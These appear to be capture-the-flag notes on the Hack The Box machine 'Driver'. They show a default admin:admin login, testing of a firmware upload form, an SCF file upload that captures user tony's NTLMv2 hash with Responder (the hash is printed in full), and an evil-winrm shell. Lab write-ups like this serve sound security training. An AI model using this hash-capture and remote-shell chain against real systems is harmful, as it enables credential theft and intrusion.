# Port 80 Enumeration

* Had authentication enable at root path; but credentials were weak. Was able to gain accss with admin:admin.
* Only two active items from the nav:
  * http://driver.htb/index.php
  * http://driver.htb/fw_up.php
  * About, Drivers Update, and Contact were present in the nav but just linked to `#`.

```html
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="#">MFP Firmware Update Center</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="index.php">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">About</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="fw_up.php">Firmware Updates</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Drivers Updates</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Contact</a>
      </li>
    </ul>
    
  </div>
</nav>
```

* Tested upload functionality at `http://driver.htb/fw_up.php`. Was able to upload `test.bin` file. I got a response with url of `http://driver.htb/fw_up.php?msg=SUCCESS`. 

```bash
echo "test firmware content" > test.bin
```

Response contained some server info:

```
HTTP/1.1 200 OK
Content-Length: 5119
Content-Type: text/html; charset=UTF-8
Date: Tue, 24 Mar 2026 19:39:51 GMT
Server: Microsoft-IIS/10.0
Via: 1.1 Caddy
X-Powered-By: PHP/7.3.25
```

* I tested various extensions and all were accepted. Got the same response with all of them as with `test.bin`.

```bash
# Test various extensions
echo "test" > test.dll
echo "test" > test.cab
echo "test" > test.exe
echo "test" > test.zip
```

Tried to access `/images/` with auth and without auth. Got 403.

```bash
└─$ curl -u admin:admin http://driver.htb/images/
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>403 - Forbidden: Access is denied.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>403 - Forbidden: Access is denied.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Was able to upload `@test.scf` file and get hit capture from responder. 

Got [ntlm hash](/home/openclaw/.openclaw/workspace-neo/htb/boxes/active/Driver/raw_data/nltm_data.txt) data of : `tony::DRIVER:16a2c9d8cc2b200f:7ED565CB429146A0967D5B865773077D:0101000000000000004626DCDBBBDC0146BF4F03F5F42E1D000000000200080030004F005A00590001001E00570049004E002D0054004B0041005200570047004900420039003700440004003400570049004E002D0054004B004100520057004700490042003900370044002E0030004F005A0059002E004C004F00430041004C000300140030004F005A0059002E004C004F00430041004C000500140030004F005A0059002E004C004F00430041004C0007000800004626DCDBBBDC0106000400020000000800300030000000000000000000000000200000403D9C3D8C3408AD9540E550DAD452DB087FB3B11DE906F9CDEA1268EE89CE990A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003300000000000000000000000000`

Cracked the hash and used to login to winrm.

```bash
└─$ evil-winrm -i 10.129.95.238 -u tony
Enter Password:

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents>
```